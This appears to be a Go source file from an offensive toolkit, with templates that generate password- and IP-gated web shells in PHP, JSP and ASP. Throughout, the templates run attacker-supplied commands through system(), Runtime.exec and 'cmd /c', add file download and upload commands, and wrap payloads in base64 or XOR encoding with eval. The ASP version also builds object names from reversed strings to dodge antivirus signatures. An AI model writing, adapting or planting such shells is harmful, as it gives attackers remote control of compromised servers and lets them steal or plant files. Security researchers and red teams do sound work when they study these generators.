package cmd

var phpTemplate = `
{{/* Get command from param or header */}}
{{ if ne .CmdHeader "" }}
  {{ index .V "cmd" }} = $_SERVER['HTTP_{{ .CmdHeader }}'];
{{ else }}

{{ if ne .Method "GET" }}
  parse_str(file_get_contents('php://input'), $_REQUEST);
{{ end }}

  {{ index .V "cmd" }} = $_REQUEST['{{ .CmdParam }}'];
{{ end }}
  {{ index .V "cmd" }} = trim({{ index .V "cmd" }});


{{ if .Whitelist }}
  {{ index .V "whitelist" }} = array({{ .Whitelist }});
  if (!in_array($_SERVER['REMOTE_ADDR'], {{ index .V "whitelist" }})) {
    die;
  }
{{- end }}


{{ if ne .Password "" }}
  {{ index .V "hash" }} = '{{ .PasswordHash }}';
{{ if ne .PasswordParam "" }}

{{ if ne .Method "" }}
  {{ index .V "pass" }} = $_REQUEST['{{ .PasswordParam }}'];
{{ end }}

{{ else if ne .PasswordHeader "" }}
  {{ index .V "pass" }} = $_SERVER['HTTP_{{ .PasswordHeader }}'];
{{ end }}
  if (md5({{ index .V "pass" }}) != {{ index .V "hash" }}) {
    die;
  }
{{- end }}


{{ if .FileCapabilities }}
  if (substr({{ index .V "cmd" }}, 0, 4) === 'get ') {
    {{ index .V "cmdArgs" }} = explode(' ', {{ index .V "cmd" }});
    {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
    if (!file_exists({{ index .V "filePath" }})) {
      header("HTTP/1.1 404 Not Found");
      die;
    }
    header("Content-Disposition: attachment; filename={{ index .V "filePath" }}");
    header("Content-Type: application/octet-stream");
    header("Content-Transfer-Encoding: binary");
    header('Content-Length: ' . filesize({{ index .V "filePath" }}));
    readfile({{ index .V "filePath" }});
    die;
  } else if (substr({{ index .V "cmd" }}, 0, 4) === 'put ') {
    {{ index .V "cmdArgs" }} = explode(' ', {{ index .V "cmd" }});
    {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
    {{ index .V "destPath" }} = basename({{ index .V "cmdArgs" }}[1]);
    if (count({{ index .V "cmdArgs" }}) > 2) {
      {{ index .V "destPath" }} = {{ index .V "cmdArgs" }}[2];
    }
    if (file_exists({{ index .V "destPath" }})) {
      echo {{ index .V "destPath" }}.' already exists';
      die;
    }
    file_put_contents({{ index .V "destPath" }}, file_get_contents('php://input'));
    echo 'Uploaded '.{{ index .V "filePath" }}.' to '.{{ index .V "destPath" }};
    die;
  }
{{ end }}

  system({{ index .V "cmd" }});
  die;



{{- define "b64" }}
eval(base64_decode('{{ .EncCode }}'))
{{ end }}



{{ define "xor" }}
{{ if ne .XorHeader "" -}}
  {{ index .V "xorKey" }} = $_SERVER["HTTP_{{ .XorHeader }}"];
{{ else if eq .Method "GET" -}}
  {{ index .V "xorKey" }} = $_REQUEST["{{ .XorParam }}"];
{{ else if eq .Method "POST" -}}
  {{ index .V "xorKey" }} = json_decode(file_get_contents('php://input'), true)['{{ .XorParam }}'];
{{ end -}}

{{ index .V "encSrc" }} = base64_decode("{{ .EncCode }}");
{{ index .V "dSrc" }} = "";
for({{ index .V "i" }}=0; {{ index .V "i" }}<strlen({{ index .V "encSrc" }}); ) {
  for({{ index .V "ii" }}=0; ({{ index .V "ii" }}<strlen({{ index .V "xorKey" }}) && {{ index .V "i" }}<strlen({{ index .V "encSrc" }})); {{ index .V "ii" }}++,{{ index .V "i" }}++) {
    {{ index .V "dSrc" }} .= {{ index .V "encSrc" }}{ {{ index .V "i" }} } ^ {{ index .V "xorKey" }}{ {{ index .V "ii" }} };
  }
}
eval({{ index .V "dSrc" }});
{{ end }}
`

var jspTemplate = `
<%@ page import="java.util.*,java.io.*" %>
{{ if ne .Password "" }}
<%@ page import="java.security.*" %>
{{ end }}
{{ if .FileCapabilities }}
{{/* <%@ page import="javax.servlet.http.*" %> */}}
{{/* <%@ page import="org.apache.commons.fileupload.*" %> */}}
{{/* <%@ page import="org.apache.commons.fileupload.disk.*" %> */}}
{{/* <%@ page import="org.apache.commons.fileupload.servlet.*" %> */}}
{{/* <%@ page import="org.apache.commons.codec.binary.*" %> */}}
{{/* <%@ page import="org.apache.commons.io.output.*" %> */}}
<%@ page import="java.nio.file.*" %>
{{ end }}
<%
try {
{{/* Get command from param or header */}}
{{ if ne .CmdHeader "" -}}
  String {{ index .V "cmd" }} = request.getHeader("{{ .CmdHeader }}");
{{ else if ne .Method "" -}}
  String {{ index .V "cmd" }} = request.getParameter("{{ .CmdParam }}");
{{ end }}


{{/* Check if ip is in whitelist */}}
{{ if .Whitelist }}

  String[] {{ index .V "whitelist" }} = { {{ .Whitelist }} };
  if (!Arrays.asList({{ index .V "whitelist" }}).contains(request.getRemoteAddr())) {
    return;
  }

{{ end }}


{{/* Check password */}}
{{ if ne .Password "" }}

  String {{ index .V "hash" }} = "{{ .PasswordHash }}";
{{ if ne .PasswordHeader "" }}
  String {{ index .V "pass" }} = request.getHeader("{{ .PasswordHeader }}");
{{ else if ne .PasswordParam "" }}
  String {{ index .V "pass" }} = request.getParameter("{{ .PasswordParam }}");
{{ end }}

  MessageDigest {{ index .V "alg" }} = MessageDigest.getInstance("MD5");
  {{ index .V "alg" }}.reset();
  {{ index .V "alg" }}.update({{ index .V "pass" }}.getBytes());
  byte[] {{ index .V "digest" }} = {{ index .V "alg" }}.digest();
  StringBuffer {{ index .V "hashFunc" }} = new StringBuffer();

  for (int {{ index .V "i" }} = 0; {{ index .V "i" }} < {{ index .V "digest" }}.length; {{ index .V "i" }}++) {
    {{ index .V "pass" }} = Integer.toHexString(0xFF & {{ index .V "digest" }}[{{ index .V "i" }}]);
    if ({{ index .V "pass" }}.length() < 2) {
      {{ index .V "pass" }} = "0" + {{ index .V "pass" }};
    }
    {{ index .V "hashFunc" }}.append({{ index .V "pass" }});
  }

  if (!{{ index .V "hash" }}.equals({{ index .V "hashFunc" }}.toString())) {
    return;
  }

{{ end }}


{{/* Include file capabilities */}}
{{ if .FileCapabilities }}
{{/* Download file */}}
  if ({{ index .V "cmd" }}.length() >= 4 && {{ index .V "cmd" }}.substring(0, 4).equals("get ")) {
    String[] {{ index .V "cmdArgs" }} = {{ index .V "cmd" }}.split(" ");
    if ({{ index .V "cmdArgs" }}.length >= 2) {
      String {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
      File {{ index .V "file" }} = new File({{ index .V "filePath" }});
      if (!{{ index .V "file" }}.exists()) {
        response.setStatus(404);
        return;
      }
      FileInputStream {{ index .V "fileStream" }} = new FileInputStream({{ index .V "file" }});
      String {{ index .V "mimeType" }} = getServletContext().getMimeType({{ index .V "filePath" }});
      if ({{ index .V "mimeType" }} == null) {
          {{ index .V "mimeType" }} = "application/octet-stream";
      }
      response.setContentType({{ index .V "mimeType" }});
      response.setContentLength((int) {{ index .V "file" }}.length());
      response.setHeader("Content-Disposition", String.format("attachment; filename=\"%s\"", {{ index .V "file" }}.getName()));

      OutputStream {{ index .V "outStream" }} = response.getOutputStream();
      byte[] {{ index .V "buffer" }} = new byte[4096];
      int {{ index .V "bytesRead" }} = -1;

      while (({{ index .V "bytesRead" }} = {{ index .V "fileStream" }}.read({{ index .V "buffer" }})) != -1) {
        {{ index .V "outStream" }}.write({{ index .V "buffer" }}, 0, {{ index .V "bytesRead" }});
      }

      {{ index .V "fileStream" }}.close();
      {{ index .V "outStream" }}.close();   

      return;
    } else {
      return;
    }
  {{/* Upload file */}}
  } else if ({{ index .V "cmd" }}.length() >= 4 && {{ index .V "cmd" }}.substring(0, 4).equals("put ")) {
    String[] {{ index .V "cmdArgs" }} = {{ index .V "cmd" }}.split(" ");
    String {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
    if ({{ index .V "cmdArgs" }}.length >= 3) {
      {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[2];
    } else {
      File f = new File({{ index .V "filePath" }});
      {{ index .V "filePath" }} = f.getName();
    }

    String {{ index .V "fileContents" }} = request.getParameter("f");
    try {
      FileOutputStream {{ index .V "outStream" }} = new FileOutputStream({{ index .V "filePath" }});
      {{ index .V "outStream" }}.write(Base64.getDecoder().decode({{ index .V "fileContents" }}));
    } catch (IllegalArgumentException e) {
      response.setStatus(500);
      out.println("Unable to decode base64.");
    } catch (IOException e) {
      response.setStatus(500);
      out.println("Unable to write file");
    }
    return;
  }

{{ end }}


{{/* Run command */}}
Process {{ index .V "process" }} = Runtime.getRuntime().exec({{ index .V "cmd" }});
DataInputStream ds = new DataInputStream({{ index .V "process" }}.getInputStream());
String {{ index .V "output" }} = ds.readLine();
while ( {{ index .V "output" }} != null ) {
  out.println({{ index .V "output" }}); 
  {{ index .V "output" }} = ds.readLine(); 
}
} catch (Exception e) {}
%>
`

var aspTemplate = `{{/* Get command from param or header */}}
{{/* dim {{ index .V "cmd" }} */}}
{{ if ne .CmdHeader "" }}
{{ index .V "cmd" }} = Request.ServerVariables("HTTP_{{ .CmdHeader }}")
{{ else }}
{{ index .V "cmd" }} = Request("{{ .CmdParam }}")
{{ end }}

{{/* Check if ip is in whitelist */}}
{{ if .Whitelist }}

{{ index .V "whitelist" }} = Array({{ .Whitelist }})
for each {{ index .V "i" }} in {{ index .V "whitelist" }}
  if {{ index .V "i" }} = Request.ServerVariables("REMOTE_ADDR") Then
    Exit For
  elseif {{ index .V "i" }} = {{ index .V "whitelist" }}(UBound({{ index .V "whitelist" }})) then
    response.end
  end if
next
{{ end }}

{{/* Check password */}}
{{ if ne .Password "" }}
{{/* dim {{ index .V "pass" }} */}}
{{ index .V "hash" }} = "{{ .PasswordHash }}"

{{ if ne .PasswordHeader "" }}
{{ index .V "pass" }} = Request.ServerVariables("HTTP_{{ .PasswordHeader }}")
{{ else if ne .PasswordParam "" }}
{{ index .V "pass" }} = request("{{ .PasswordParam }}")
{{ end }}
{{/* Hash and compare */}}
{{/* Dim {{ index .V "asc" }}, {{ index .V "alg" }}, {{ index .V "hashFunc" }}, {{ index .V "digest" }}, {{ index .V "i" }} */}}

Set {{ index .V "asc" }} = CreateObject("System.Text.UTF8Encoding")
Set {{ index .V "alg" }} = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
{{ index .V "hashFunc" }} = {{ index .V "asc" }}.GetBytes_4({{ index .V "pass" }})
{{ index .V "hashFunc" }} = {{ index .V "alg" }}.ComputeHash_2(({{ index .V "hashFunc" }}))
{{ index .V "digest" }} = ""
For {{ index .V "i" }} = 1 To LenB({{ index .V "hashFunc" }})
  {{ index .V "digest" }} = {{ index .V "digest" }} & LCase(Right("0" & Hex(AscB(MidB({{ index .V "hashFunc" }}, {{ index .V "i" }}, 1))), 2))
Next

if {{ index .V "digest" }} <> {{ index .V "hash" }} Then
  response.end
end if
{{ end }}

{{/* Include file capabilities */}}
{{ if .FileCapabilities }}
On Error Resume Next

{{/* Download file */}}
if Left({{ index .V "cmd" }}, 4) = "get " Then
  {{/* dim {{ index .V "cmdArgs" }} */}}
  {{ index .V "cmdArgs" }} = Split({{ index .V "cmd" }}, " ")(1)

  {{/* Dim {{ index .V "fs" }}
  Dim {{ index .V "file" }}
  Dim {{ index .V "fileStream" }} */}}

  Set {{ index .V "fs" }} = Server.CreateObject("Scripting.FileSystemObject")
  If {{ index .V "fs" }}.FileExists({{ index .V "cmdArgs" }}) Then
    Set {{ index .V "file" }} = {{ index .V "fs" }}.GetFile({{ index .V "cmdArgs" }})

    Response.Clear 
    Response.AddHeader "Content-Disposition", "attachment; filename=" & {{ index .V "file" }}.Name
    Response.AddHeader "Content-Length", {{ index .V "file" }}.Size
    Response.ContentType = "application/octet-stream"

    Set {{ index .V "fileStream" }} = Server.CreateObject("ADODB.Stream")
    {{ index .V "fileStream" }}.Type = 1
    {{ index .V "fileStream" }}.Open
    {{ index .V "fileStream" }}.LoadFromFile({{ index .V "cmdArgs" }})

    Response.BinaryWrite({{ index .V "fileStream" }}.Read)
    {{ index .V "fileStream" }}.Close
    If Err.Number <> 0 Then
      Response.Clear
      Response.Status = 500
      Response.Write Err.Description
      Response.End
    End If

    Set {{ index .V "fileStream" }} = Nothing
    Set {{ index .V "file" }} = Nothing
  Else '{{ index .V "fs" }}.FileExists({{ index .V "cmdArgs" }})
    Response.Clear
    Response.Status = 404
    Response.Write("File not found.")
  End If

  Set {{ index .V "fs" }} = Nothing
  response.end

{{/* Upload file */}}
elseif Left({{ index .V "cmd" }}, 4) = "put " Then
  {{ index .V "cmdArgs" }} = Split({{ index .V "cmd" }}, " ")
  {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}(1)
  set {{ index .V "fs" }}=Server.CreateObject("Scripting.FileSystemObject")
  If ubound({{ index .V "cmdArgs" }}) > 1 Then
    {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}(2)
  Else
    {{ index .V "filePath" }}={{ index .V "fs" }}.getfilename({{ index .V "filePath" }})
  End If
  response.write {{ index .V "filePath" }} 

  set {{ index .V "encSrc" }} = CreateObject("Msxml2.DOMDocument").CreateElement("aux")
  {{ index .V "encSrc" }}.DataType = "bin.base64Var"
  {{ index .V "encSrc" }}.Text = Request("f")
  set {{ index .V "fileContents" }} = CreateObject("ADODB.Stream")
  {{ index .V "fileContents" }}.Type = 1 ' adTypeBinary
  {{ index .V "fileContents" }}.Open
  {{ index .V "fileContents" }}.Write {{ index .V "encSrc" }}.NodeTypedValue
  {{ index .V "fileContents" }}.Position = 0
  {{/* {{ index .V "fileContents" }}.Type = 2 ' adTypeText */}}
  {{ index .V "fileContents" }}.CharSet = "utf-8"
  set {{ index .V "file" }}={{ index .V "fs" }}.CreateTextFile("C:\inetpub\wwwroot\nice.php",true)
  {{ index .V "file" }}.write {{ index .V "fileContents" }}.ReadText
  response.end
end if
{{ end }}

{{/* Run command */}}
Set {{ index .V "process" }} = CreateObject("WScript.Shell").exec("cmd /c " & {{ index .V "cmd" }})
Response.Write({{ index .V "process" }}.StdOut.ReadAll)



{{- define "b64" }}
{{/* Dim {{ index .V "encObj" }}, {{ index .V "b64" }}, {{ index .V "binStream" }} */}}
{{ index .V "base64Var" }} = "46"
{{ index .V "msxmlVar" }} = "tnEmu" & "CoD"
{{ index .V "msxmlVar" }} = "0.3." & {{ index .V "msxmlVar" }} & "mod"
{{ index .V "msxmlVar" }} = {{ index .V "msxmlVar" }} & ".2l"
{{ index .V "msxmlVar" }} = {{ index .V "msxmlVar" }} & "mXs"
Set {{ index .V "encObj" }} = CreateObject(strreverse({{ index .V "msxmlVar" }} & "m"))
{{ index .V "base64Var" }} = {{ index .V "base64Var" }} & "esab"
Set {{ index .V "b64" }} = {{ index .V "encObj" }}.CreateElement(strreverse({{ index .V "base64Var" }}))
{{ index .V "b64" }}.dataType = "bin." & strreverse({{ index .V "base64Var" }})
{{ index .V "b64" }}.text = "{{ .EncCode }}"
Set {{ index .V "binStream" }} = CreateObject("ADODB.Stream")
{{ index .V "binStream" }}.Type = 1
{{ index .V "binStream" }}.Open
{{ index .V "binStream" }}.Write {{ index .V "b64" }}.nodeTypedValue
{{ index .V "binStream" }}.Position = 0
{{ index .V "binStream" }}.Type = 2
{{ index .V "binStream" }}.CharSet = "us-ascii"
Execute({{ index .V "binStream" }}.ReadText)
{{ end }}



{{ define "xor" -}}
{{ if ne .EncHeader "" -}}
{{ index .V "encKey" }} = Request.ServerVariables("HTTP_{{ .EncHeader }}")
{{ else }}
{{ index .V "encKey" }} = Request("{{ .EncParam }}")
{{ end -}}

{{ index .V "cmd" }} = "{{ .EncCode }}"
{{/* Dim {{ index .V "encObj" }}, {{ index .V "b64" }}, {{ index .V "binStream" }}, {{ index .V "keyChar" }}, {{ index .V "i" }} */}}
Set {{ index .V "encObj" }} = CreateObject("Msxml2.DOMDocument.3.0")
Set {{ index .V "b64" }} = {{ index .V "encObj" }}.CreateElement("base64Var")
{{ index .V "b64" }}.dataType = "bin.base64Var"
{{ index .V "b64" }}.text = {{ index .V "cmd" }}
Set {{ index .V "binStream" }} = CreateObject("ADODB.Stream")
{{ index .V "binStream" }}.Type = 1
{{ index .V "binStream" }}.Open
{{ index .V "binStream" }}.Write {{ index .V "b64" }}.nodeTypedValue
{{ index .V "binStream" }}.Position = 0
{{ index .V "binStream" }}.Type = 2
{{ index .V "binStream" }}.CharSet = "us-ascii"
{{ index .V "cmd" }} = {{ index .V "binStream" }}.ReadText
for {{ index .V "i" }} = 1 to Len({{ index .V "cmd" }})
  if {{ index .V "i" }} Mod Len({{ index .V "encKey" }}) = 0 then
    {{ index .V "keyChar" }} = asc(Right({{ index .V "encKey" }},1))
  Else
    {{ index .V "keyChar" }} = asc(mid({{ index .V "encKey" }},{{ index .V "i" }} Mod Len({{ index .V "encKey" }}),1))
  end if
  {{ index .V "keyChar" }} =  asc(mid({{ index .V "cmd" }},{{ index .V "i" }},1)) Xor {{ index .V "keyChar" }}
  wow =  wow & Chr({{ index .V "keyChar" }})
next
Execute(wow)
{{ end }}
`
